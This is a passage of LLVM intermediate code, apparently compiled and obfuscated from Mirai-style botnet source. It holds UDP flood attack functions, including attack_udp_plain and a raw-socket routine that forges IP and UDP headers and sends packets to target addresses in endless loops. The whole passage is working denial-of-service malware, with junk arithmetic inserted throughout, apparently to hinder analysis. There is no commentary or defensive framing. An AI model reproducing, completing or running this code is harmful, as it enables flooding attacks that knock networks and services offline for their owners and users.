  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 3, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 4, i32 64)
  %42 = trunc i32 %41 to i8
  store i8 %42, i8* %14, align 1
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 5, i32 0)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = load i8, i8* %7, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 6, i32 65535)
  %50 = trunc i32 %49 to i16
  store i16 %50, i16* %16, align 2
  %51 = load i8, i8* %7, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 7, i32 27015)
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %17, align 2
  call void @table_unlock_val(i8 zeroext 54)
  %55 = call i8* @table_retrieve_val(i32 54, i32* %19)
  store i8* %55, i8** %18, align 8
  %56 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %56, i32* %10, align 4
  %57 = icmp eq i32 %56, -1
  br i1 %57, label %58, label %59

; <label>:58:                                     ; preds = %4
  br label %336

; <label>:59:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %60 = load i32, i32* %10, align 4
  %61 = bitcast i32* %9 to i8*
  %62 = call i32 @setsockopt(i32 %60, i32 0, i32 3, i8* %61, i32 4) #6
  %63 = icmp eq i32 %62, -1
  br i1 %63, label %64, label %67

; <label>:64:                                     ; preds = %59
  %65 = load i32, i32* %10, align 4
  %66 = call i32 @close(i32 %65)
  br label %336

; <label>:67:                                     ; preds = %59
  store i32 0, i32* %9, align 4
  br label %68

; <label>:68:                                     ; preds = %194, %67
  %69 = load i32, i32* %9, align 4
  %70 = load i8, i8* %5, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp slt i32 %69, %71
  br i1 %72, label %73, label %200

; <label>:73:                                     ; preds = %68
  %74 = call noalias i8* @calloc(i64 128, i64 1) #6
  %75 = load i8**, i8*** %11, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8*, i8** %75, i64 %77
  store i8* %74, i8** %78, align 8
  %79 = load i8**, i8*** %11, align 8
  %80 = load i32, i32* %9, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i8*, i8** %79, i64 %81
  %83 = load i8*, i8** %82, align 8
  %84 = bitcast i8* %83 to %struct.iphdr*
  store %struct.iphdr* %84, %struct.iphdr** %20, align 8
  %85 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %86 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %85, i64 1
  %87 = bitcast %struct.iphdr* %86 to %struct.udphdr*
  store %struct.udphdr* %87, %struct.udphdr** %21, align 8
  %88 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %89 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %88, i64 1
  %90 = bitcast %struct.udphdr* %89 to i8*
  store i8* %90, i8** %22, align 8
  %91 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %92 = bitcast %struct.iphdr* %91 to i8*
  %93 = load i8, i8* %92, align 4
  %94 = xor i8 15, -1
  %95 = xor i8 %93, %94
  %96 = and i8 %95, %93
  %97 = and i8 %93, 15
  %98 = and i8 %96, 64
  %99 = xor i8 %96, 64
  %100 = or i8 %98, %99
  %101 = or i8 %96, 64
  store i8 %100, i8* %92, align 4
  %102 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %103 = bitcast %struct.iphdr* %102 to i8*
  %104 = load i8, i8* %103, align 4
  %105 = xor i8 %104, -1
  %106 = xor i8 -16, -1
  %107 = xor i8 123, -1
  %108 = or i8 %105, %106
  %109 = or i8 123, %107
  %110 = xor i8 %108, -1
  %111 = and i8 %110, %109
  %112 = and i8 %104, -16
  %113 = xor i8 %111, -1
  %114 = xor i8 5, -1
  %115 = xor i8 -124, -1
  %116 = and i8 %113, -124
  %117 = and i8 %111, %115
  %118 = and i8 %114, -124
  %119 = and i8 5, %115
  %120 = or i8 %116, %117
  %121 = or i8 %118, %119
  %122 = xor i8 %120, %121
  %123 = or i8 %113, %114
  %124 = xor i8 %123, -1
  %125 = or i8 -124, %115
  %126 = and i8 %124, %125
  %127 = or i8 %122, %126
  %128 = or i8 %111, 5
  store i8 %127, i8* %103, align 4
  %129 = load i8, i8* %12, align 1
  %130 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %131 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %130, i32 0, i32 1
  store i8 %129, i8* %131, align 1
  %132 = load i32, i32* %19, align 4
  %133 = sext i32 %132 to i64
  %134 = add i64 32, 3038950070620196922
  %135 = add i64 %134, %133
  %136 = sub i64 %135, 3038950070620196922
  %137 = add i64 32, %133
  %138 = trunc i64 %136 to i16
  %139 = call zeroext i16 @htons(i16 zeroext %138) #7
  %140 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %141 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %140, i32 0, i32 2
  store i16 %139, i16* %141, align 2
  %142 = load i16, i16* %13, align 2
  %143 = call zeroext i16 @htons(i16 zeroext %142) #7
  %144 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %145 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %144, i32 0, i32 3
  store i16 %143, i16* %145, align 4
  %146 = load i8, i8* %14, align 1
  %147 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %148 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %147, i32 0, i32 5
  store i8 %146, i8* %148, align 4
  %149 = load i8, i8* %15, align 1
  %150 = icmp ne i8 %149, 0
  br i1 %150, label %151, label %155

; <label>:151:                                    ; preds = %73
  %152 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %153 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i32 0, i32 4
  store i16 %152, i16* %154, align 2
  br label %155

; <label>:155:                                    ; preds = %151, %73
  %156 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %157 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %156, i32 0, i32 6
  store i8 17, i8* %157, align 1
  %158 = load i32, i32* @LOCAL_ADDR, align 4
  %159 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %160 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i32 0, i32 8
  store i32 %158, i32* %160, align 4
  %161 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %162 = load i32, i32* %9, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %161, i64 %163
  %165 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i32 0, i32 1
  %166 = load i32, i32* %165, align 4
  %167 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %168 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %167, i32 0, i32 9
  store i32 %166, i32* %168, align 4
  %169 = load i16, i16* %16, align 2
  %170 = call zeroext i16 @htons(i16 zeroext %169) #7
  %171 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %172 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %171, i32 0, i32 0
  store i16 %170, i16* %172, align 2
  %173 = load i16, i16* %17, align 2
  %174 = call zeroext i16 @htons(i16 zeroext %173) #7
  %175 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %176 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %175, i32 0, i32 1
  store i16 %174, i16* %176, align 2
  %177 = load i32, i32* %19, align 4
  %178 = sext i32 %177 to i64
  %179 = sub i64 12, -2584264814416077457
  %180 = add i64 %179, %178
  %181 = add i64 %180, -2584264814416077457
  %182 = add i64 12, %178
  %183 = trunc i64 %181 to i16
  %184 = call zeroext i16 @htons(i16 zeroext %183) #7
  %185 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %186 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %185, i32 0, i32 2
  store i16 %184, i16* %186, align 2
  %187 = load i8*, i8** %22, align 8
  %188 = bitcast i8* %187 to i32*
  store i32 -1, i32* %188, align 4
  %189 = load i8*, i8** %22, align 8
  %190 = getelementptr inbounds i8, i8* %189, i64 4
  store i8* %190, i8** %22, align 8
  %191 = load i8*, i8** %22, align 8
  %192 = load i8*, i8** %18, align 8
  %193 = load i32, i32* %19, align 4
  call void @util_memcpy(i8* %191, i8* %192, i32 %193)
  br label %194

; <label>:194:                                    ; preds = %155
  %195 = load i32, i32* %9, align 4
  %196 = add i32 %195, 2134958337
  %197 = add i32 %196, 1
  %198 = sub i32 %197, 2134958337
  %199 = add nsw i32 %195, 1
  store i32 %198, i32* %9, align 4
  br label %68

; <label>:200:                                    ; preds = %68
  br label %201

; <label>:201:                                    ; preds = %335, %200
  store i32 0, i32* %9, align 4
  br label %202

; <label>:202:                                    ; preds = %329, %201
  %203 = load i32, i32* %9, align 4
  %204 = load i8, i8* %5, align 1
  %205 = zext i8 %204 to i32
  %206 = icmp slt i32 %203, %205
  br i1 %206, label %207, label %335

; <label>:207:                                    ; preds = %202
  %208 = load i8**, i8*** %11, align 8
  %209 = load i32, i32* %9, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds i8*, i8** %208, i64 %210
  %212 = load i8*, i8** %211, align 8
  store i8* %212, i8** %23, align 8
  %213 = load i8*, i8** %23, align 8
  %214 = bitcast i8* %213 to %struct.iphdr*
  store %struct.iphdr* %214, %struct.iphdr** %24, align 8
  %215 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %216 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %215, i64 1
  %217 = bitcast %struct.iphdr* %216 to %struct.udphdr*
  store %struct.udphdr* %217, %struct.udphdr** %25, align 8
  %218 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %219 = load i32, i32* %9, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %218, i64 %220
  %222 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %221, i32 0, i32 2
  %223 = load i8, i8* %222, align 4
  %224 = zext i8 %223 to i32
  %225 = icmp slt i32 %224, 32
  br i1 %225, label %226, label %249

; <label>:226:                                    ; preds = %207
  %227 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %228 = load i32, i32* %9, align 4
  %229 = sext i32 %228 to i64
  %230 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %227, i64 %229
  %231 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %230, i32 0, i32 1
  %232 = load i32, i32* %231, align 4
  %233 = call i32 @ntohl(i32 %232) #7
  %234 = call i32 @rand_next()
  %235 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %236 = load i32, i32* %9, align 4
  %237 = sext i32 %236 to i64
  %238 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %235, i64 %237
  %239 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %238, i32 0, i32 2
  %240 = load i8, i8* %239, align 4
  %241 = zext i8 %240 to i32
  %242 = lshr i32 %234, %241
  %243 = sub i32 0, %242
  %244 = sub i32 %233, %243
  %245 = add i32 %233, %242
  %246 = call i32 @htonl(i32 %244) #7
  %247 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %248 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %247, i32 0, i32 9
  store i32 %246, i32* %248, align 4
  br label %249

; <label>:249:                                    ; preds = %226, %207
  %250 = load i16, i16* %13, align 2
  %251 = zext i16 %250 to i32
  %252 = icmp eq i32 %251, 65535
  br i1 %252, label %253, label %258

; <label>:253:                                    ; preds = %249
  %254 = call i32 @rand_next()
  %255 = trunc i32 %254 to i16
  %256 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %257 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %256, i32 0, i32 3
  store i16 %255, i16* %257, align 4
  br label %258

; <label>:258:                                    ; preds = %253, %249
  %259 = load i16, i16* %16, align 2
  %260 = zext i16 %259 to i32
  %261 = icmp eq i32 %260, 65535
  br i1 %261, label %262, label %267

; <label>:262:                                    ; preds = %258
  %263 = call i32 @rand_next()
  %264 = trunc i32 %263 to i16
  %265 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %266 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %265, i32 0, i32 0
  store i16 %264, i16* %266, align 2
  br label %267

; <label>:267:                                    ; preds = %262, %258
  %268 = load i16, i16* %17, align 2
  %269 = zext i16 %268 to i32
  %270 = icmp eq i32 %269, 65535
  br i1 %270, label %271, label %276

; <label>:271:                                    ; preds = %267
  %272 = call i32 @rand_next()
  %273 = trunc i32 %272 to i16
  %274 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %275 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %274, i32 0, i32 1
  store i16 %273, i16* %275, align 2
  br label %276

; <label>:276:                                    ; preds = %271, %267
  %277 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %278 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %277, i32 0, i32 7
  store i16 0, i16* %278, align 2
  %279 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %280 = bitcast %struct.iphdr* %279 to i16*
  %281 = call zeroext i16 @checksum_generic(i16* %280, i32 20)
  %282 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %283 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %282, i32 0, i32 7
  store i16 %281, i16* %283, align 2
  %284 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %285 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %284, i32 0, i32 3
  store i16 0, i16* %285, align 2
  %286 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %287 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %288 = bitcast %struct.udphdr* %287 to i8*
  %289 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %290 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %289, i32 0, i32 2
  %291 = load i16, i16* %290, align 2
  %292 = load i32, i32* %19, align 4
  %293 = sext i32 %292 to i64
  %294 = sub i64 12, 9207405602001480807
  %295 = add i64 %294, %293
  %296 = add i64 %295, 9207405602001480807
  %297 = add i64 12, %293
  %298 = trunc i64 %296 to i32
  %299 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %286, i8* %288, i16 zeroext %291, i32 %298)
  %300 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %301 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %300, i32 0, i32 3
  store i16 %299, i16* %301, align 2
  %302 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %303 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %302, i32 0, i32 1
  %304 = load i16, i16* %303, align 2
  %305 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %306 = load i32, i32* %9, align 4
  %307 = sext i32 %306 to i64
  %308 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %305, i64 %307
  %309 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %308, i32 0, i32 0
  %310 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %309, i32 0, i32 1
  store i16 %304, i16* %310, align 2
  %311 = load i32, i32* %10, align 4
  %312 = load i8*, i8** %23, align 8
  %313 = load i32, i32* %19, align 4
  %314 = sext i32 %313 to i64
  %315 = add i64 32, -6846326622437055857
  %316 = add i64 %315, %314
  %317 = sub i64 %316, -6846326622437055857
  %318 = add i64 32, %314
  %319 = bitcast %union.__CONST_SOCKADDR_ARG* %26 to %struct.sockaddr**
  %320 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %321 = load i32, i32* %9, align 4
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %320, i64 %322
  %324 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %323, i32 0, i32 0
  %325 = bitcast %struct.sockaddr_in* %324 to %struct.sockaddr*
  store %struct.sockaddr* %325, %struct.sockaddr** %319, align 8
  %326 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %26, i32 0, i32 0
  %327 = load %struct.sockaddr*, %struct.sockaddr** %326, align 8
  %328 = call i64 @sendto(i32 %311, i8* %312, i64 %317, i32 16384, %struct.sockaddr* %327, i32 16)
  br label %329

; <label>:329:                                    ; preds = %276
  %330 = load i32, i32* %9, align 4
  %331 = sub i32 %330, 1032652983
  %332 = add i32 %331, 1
  %333 = add i32 %332, 1032652983
  %334 = add nsw i32 %330, 1
  store i32 %333, i32* %9, align 4
  br label %202

; <label>:335:                                    ; preds = %202
  br label %201

; <label>:336:                                    ; preds = %64, %58
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_plain(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 %24, i64 8) #6
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 4) #6
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 7, i32 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 6, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 0, i32 512)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 1, i32 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 16, i32 4, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  %50 = icmp eq i32 %49, 65535
  br i1 %50, label %51, label %54

; <label>:51:                                     ; preds = %4
  %52 = call i32 @rand_next()
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %13, align 2
  br label %57

; <label>:54:                                     ; preds = %4
  %55 = load i16, i16* %13, align 2
  %56 = call zeroext i16 @htons(i16 zeroext %55) #7
  store i16 %56, i16* %13, align 2
  br label %57

; <label>:57:                                     ; preds = %54, %51
  store i32 0, i32* %9, align 4
  br label %58

; <label>:58:                                     ; preds = %173, %57
  %59 = load i32, i32* %9, align 4
  %60 = load i8, i8* %5, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp slt i32 %59, %61
  br i1 %62, label %63, label %179

; <label>:63:                                     ; preds = %58
  %64 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %65 = load i8**, i8*** %10, align 8
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8*, i8** %65, i64 %67
  store i8* %64, i8** %68, align 8
  %69 = load i16, i16* %12, align 2
  %70 = zext i16 %69 to i32
  %71 = icmp eq i32 %70, 65535
  br i1 %71, label %72, label %81

; <label>:72:                                     ; preds = %63
  %73 = call i32 @rand_next()
  %74 = trunc i32 %73 to i16
  %75 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %75, i64 %77
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %78, i32 0, i32 0
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %79, i32 0, i32 1
  store i16 %74, i16* %80, align 2
  br label %90

; <label>:81:                                     ; preds = %63
  %82 = load i16, i16* %12, align 2
  %83 = call zeroext i16 @htons(i16 zeroext %82) #7
  %84 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %85 = load i32, i32* %9, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %84, i64 %86
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i32 0, i32 0
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %88, i32 0, i32 1
  store i16 %83, i16* %89, align 2
  br label %90

; <label>:90:                                     ; preds = %81, %72
  %91 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %92 = load i32*, i32** %11, align 8
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i32, i32* %92, i64 %94
  store i32 %91, i32* %95, align 4
  %96 = icmp eq i32 %91, -1
  br i1 %96, label %97, label %98

; <label>:97:                                     ; preds = %90
  ret void

; <label>:98:                                     ; preds = %90
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %99, align 4
  %100 = load i16, i16* %13, align 2
  %101 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %100, i16* %101, align 2
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %103 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %102, i32 0, i32 0
  store i32 0, i32* %103, align 4
  %104 = load i32*, i32** %11, align 8
  %105 = load i32, i32* %9, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i32, i32* %104, i64 %106
  %108 = load i32, i32* %107, align 4
  %109 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %110 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %110, %struct.sockaddr** %109, align 8
  %111 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %112 = load %struct.sockaddr*, %struct.sockaddr** %111, align 8
  %113 = call i32 @bind(i32 %108, %struct.sockaddr* %112, i32 16) #6
  %114 = icmp eq i32 %113, -1
  br i1 %114, label %115, label %116

; <label>:115:                                    ; preds = %98
  br label %116

; <label>:116:                                    ; preds = %115, %98
  %117 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %118 = load i32, i32* %9, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %117, i64 %119
  %121 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %120, i32 0, i32 2
  %122 = load i8, i8* %121, align 4
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %123, 32
  br i1 %124, label %125, label %154

; <label>:125:                                    ; preds = %116
  %126 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %127 = load i32, i32* %9, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %126, i64 %128
  %130 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %129, i32 0, i32 1
  %131 = load i32, i32* %130, align 4
  %132 = call i32 @ntohl(i32 %131) #7
  %133 = call i32 @rand_next()
  %134 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %135 = load i32, i32* %9, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %134, i64 %136
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %137, i32 0, i32 2
  %139 = load i8, i8* %138, align 4
  %140 = zext i8 %139 to i32
  %141 = lshr i32 %133, %140
  %142 = sub i32 %132, 706030197
  %143 = add i32 %142, %141
  %144 = add i32 %143, 706030197
  %145 = add i32 %132, %141
  %146 = call i32 @htonl(i32 %144) #7
  %147 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %148 = load i32, i32* %9, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i64 %149
  %151 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %150, i32 0, i32 0
  %152 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %151, i32 0, i32 2
  %153 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %152, i32 0, i32 0
  store i32 %146, i32* %153, align 4
  br label %154

; <label>:154:                                    ; preds = %125, %116
  %155 = load i32*, i32** %11, align 8
  %156 = load i32, i32* %9, align 4
  %157 = sext i32 %156 to i64
  %158 = getelementptr inbounds i32, i32* %155, i64 %157
  %159 = load i32, i32* %158, align 4
  %160 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %161 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %162 = load i32, i32* %9, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %161, i64 %163
  %165 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i32 0, i32 0
  %166 = bitcast %struct.sockaddr_in* %165 to %struct.sockaddr*
  store %struct.sockaddr* %166, %struct.sockaddr** %160, align 8
  %167 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %168 = load %struct.sockaddr*, %struct.sockaddr** %167, align 8
  %169 = call i32 @connect(i32 %159, %struct.sockaddr* %168, i32 16)
  %170 = icmp eq i32 %169, -1
  br i1 %170, label %171, label %172

; <label>:171:                                    ; preds = %154
  br label %172

; <label>:172:                                    ; preds = %171, %154
  br label %173

; <label>:173:                                    ; preds = %172
  %174 = load i32, i32* %9, align 4
  %175 = sub i32 %174, -1448905144
  %176 = add i32 %175, 1
  %177 = add i32 %176, -1448905144
  %178 = add nsw i32 %174, 1
  store i32 %177, i32* %9, align 4
  br label %58

; <label>:179:                                    ; preds = %58
  br label %180

; <label>:180:                                    ; preds = %213, %179
  store i32 0, i32* %9, align 4
  br label %181

; <label>:181:                                    ; preds = %208, %180
  %182 = load i32, i32* %9, align 4
  %183 = load i8, i8* %5, align 1
  %184 = zext i8 %183 to i32
  %185 = icmp slt i32 %182, %184
  br i1 %185, label %186, label %213

; <label>:186:                                    ; preds = %181
  %187 = load i8**, i8*** %10, align 8
  %188 = load i32, i32* %9, align 4
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds i8*, i8** %187, i64 %189
  %191 = load i8*, i8** %190, align 8
  store i8* %191, i8** %22, align 8
  %192 = load i8, i8* %15, align 1
  %193 = icmp ne i8 %192, 0
  br i1 %193, label %194, label %198

; <label>:194:                                    ; preds = %186
  %195 = load i8*, i8** %22, align 8
  %196 = load i16, i16* %14, align 2
  %197 = zext i16 %196 to i32
  call void @rand_str(i8* %195, i32 %197)
  br label %198

; <label>:198:                                    ; preds = %194, %186
  %199 = load i32*, i32** %11, align 8
  %200 = load i32, i32* %9, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds i32, i32* %199, i64 %201
  %203 = load i32, i32* %202, align 4
  %204 = load i8*, i8** %22, align 8
  %205 = load i16, i16* %14, align 2
  %206 = zext i16 %205 to i64
  %207 = call i64 @send(i32 %203, i8* %204, i64 %206, i32 16384)
  br label %208

; <label>:208:                                    ; preds = %198
  %209 = load i32, i32* %9, align 4
  %210 = sub i32 0, 1
  %211 = sub i32 %209, %210
  %212 = add nsw i32 %209, 1
  store i32 %211, i32* %9, align 4
  br label %181

; <label>:213:                                    ; preds = %181
  br label %180
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_generic(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
